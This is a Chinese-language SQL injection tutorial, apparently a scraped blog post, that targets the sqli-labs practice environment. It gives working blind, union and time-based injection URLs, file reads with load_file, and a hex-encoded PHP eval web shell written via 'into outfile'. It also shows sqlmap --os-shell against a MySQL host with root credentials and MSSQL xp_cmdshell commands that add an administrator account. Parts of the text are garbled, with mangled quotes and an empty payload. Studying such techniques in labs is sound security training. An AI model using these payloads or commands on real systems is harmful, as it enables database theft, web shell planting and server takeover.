http://127.0.0.1/sqli/Less-5/?id=-1 我们得到下面的页面 当我们输入 http://127.0.0.1/sqli/Less-5/?id=1‘ 我们得到下面的页面 当输入正确时显示 You are in… 当我们显示语句错误时，就不显示任何数据 当我们的语法有错误时，就报出SQL语句错误 可以推断出代码： 12345678910`$result=mysql_query($sql);``$row = mysql_fetch_array($result);` if($row) &#123; `echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;;` ```&#125;` 通过构造一些判断语句，正式猜想；盲注一般用到的一些函数：ascii() 、substr() 、length()，exists()、concat()等 1.判断数据类型 MySQL数据库的特有的表是 information_schema.tables , access数据库特有的表是 msysobjects ； SQLServer 数据库特有的表是 sysobjects 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库 判断数据类型： 12判断是否是 Mysql数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) --+ 2 判断当前数据库名 1：判断当前数据库的长度，利用二分法http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 –+ //正常显示http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10 –+ //不显示任何数据http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7 –+//正常显示http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8 –+//不显示任何数据`` 大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为 8 122：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断判断数据库的第一个字符 大于114 不大于115 第一个字符是S 依次类推 union 注入union 联合查询适用于有显示列的注入； 通过order by来判断当前表的列数。得知表有 3列 “SELECT * FROM users WHERE id=’1’ order by 3 –+ ’’ LIMIT 0,1” 直接把前面 id=1 改成 id =-1 执行后面的语句 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,3 –+ 由上图可知，第二和第三个位置显示列信息 文件读写有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取； 文件写入只能利用 union 注入 union注入读取文件 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,load_file(“e:/read.txt”) –+ 把 e:/read.txt 转换成16进制 0x653a2f332e747874 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,load_file(0x653a2f726561642e747874) –+ union写入文件 利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,’‘ into outfile ‘e:/4.php’ –+ 可以将一句话木马转换成16进制的形式 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile ‘e:/44.php’ –+ E 盘下： sleep延时注入利用前提：页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep(5)条件之后，页面的返回速度明显慢了 5 秒。 优点：不需要显示位，不需要出错信息。缺点：速度慢，耗费大量时间 sleep 函数判断页面响应时间 if(判断条件，为true时执行，为false时执行) 我们可以构造下面的语句，判断条件是否成立。然后不断变换函数直到获取到我们想要的信息 //判断是否存在延时注入http://127.0.0.1/sqli/Less-1/?id=1&#39; and sleep(5) –+ //页面延时5秒响应 // 判断数据库的第一个字符的ascii值是否大于100，如果大于100，页面立即响应，如果不大于，页面延时5秒响应http://127.0.0.1/sqli/Less-1/?id=1&#39; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) –+ 使用sqlmap直连数据库获取webshell直接连mysql数据库sqlmap -d “mysql://root:password@192.168.1.116:3306/mysql” –os-shell 如图所示，需要设置后端数据库的架构，服务器多为64位，可以先选择64位即输入数字2进行测试，如果不是，可以退出后再次运行并选择。 上传UDF文件选择系统架构后，sqlmap会自动上传udf文件到服务器提权位置，会显示一些信息。Sqlmap不管获取的shell是否成功都显示os-shell提示符。 执行命令 针对相应的系统执行一些命令来验证是否真正获取shell，执行ipconfig命令来查看网卡配置内容，在本例中成功获取shell。 MSSQL提权 SQL Server 2005 中引入的 xp_cmdshell 选项是服务器配置选项，该选项使系统管理员能够控制是否可以在系统上执行 xp_cmdshell 扩展存储过程。默认情况下，xp_cmdshell 选项在新安装的软件上处于禁用状态，但是可以使用基于策略的管理或运行 sp_configure 系统存储过程来启用它。当用户拿到了sa的权限或者是具有数据库管理员权限的其他用户，可以通过启用xp_cmdshell来执行系统命令，从而完成提权。 操作步骤： 利用webshell查看网站的数据库连接文件，发现是用sa用户连接的，并获取到了sa用户的密码 利用获取到的数据库信息，连接MSSQL数据库 启用xp_cmdshell及Xplog70.dll：use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’) exec master.dbo.xp_cmdshell ‘whoami’ exec master.dbo.xp_cmdshell ‘net user zsc66 zsc0810 /ad &amp; net localgroup administrators zsc66 /ad’ 创建密码为zsc0810的 zsc66 用户 并添加到管理员 参考资料https://www.runoob.com/mysql/mysql-functions.html https://blog.csdn.net/qq_36119192/article/details/81987834 https://www.freebuf.com/articles/system/163144.html https://www.freebuf.com/news/151634.html]]></content>
  </entry>
</search>
